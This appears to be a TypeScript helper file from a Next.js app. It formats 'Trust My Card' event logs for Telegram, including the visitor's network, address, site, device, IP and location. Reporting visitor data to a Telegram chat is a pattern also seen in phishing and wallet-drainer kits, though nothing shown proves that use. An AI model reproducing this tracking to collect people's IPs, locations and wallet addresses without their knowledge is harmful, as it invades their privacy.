import type { NextRequest } from "next/server";
import type { EnrichedTgLog } from "./types";

export function okResponse(sent: boolean, data?: Partial<EnrichedTgLog>) {
  return {
    code: 200,
    status: "success",
    message: "OK",
    data: { sent, ...data },
    timestamp: new Date().toISOString(),
  };
}

export function deviceFromUa(ua: string): string {
  const u = ua.toLowerCase();
  if (/ipad|tablet/.test(u)) return "Tablet";
  if (/mobi|iphone|android/.test(u)) return "Mobile";
  if (/mac|win|linux|cros/.test(u)) return "Desktop";
  return "Other";
}

export function clientIp(req: NextRequest, bodyIp?: string): string {
  if (bodyIp?.trim()) return bodyIp.trim();
  return (
    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    req.headers.get("x-real-ip") ||
    "unknown"
  );
}

export function formatTelegramMessage(enriched: EnrichedTgLog): string {
  return (
    `<b>Trust My Card — ${enriched.type}</b>\n` +
    `\n<b>status</b>: <code>${enriched.status}</code>` +
    `\n<b>network</b>: <code>${enriched.network}</code>` +
    `\n<b>address</b>: <code>${enriched.address}</code>` +
    `\n<b>site</b>: <code>${enriched.site}</code>` +
    `\n<b>device</b>: <code>${enriched.device}</code>` +
    `\n<b>ip</b>: <code>${enriched.ip}</code>` +
    `\n<b>location</b>: <code>${enriched.location}</code>` +
    (enriched.error
      ? `\n<b>error</b>: <code>${enriched.error}</code>`
      : "")
  );
}
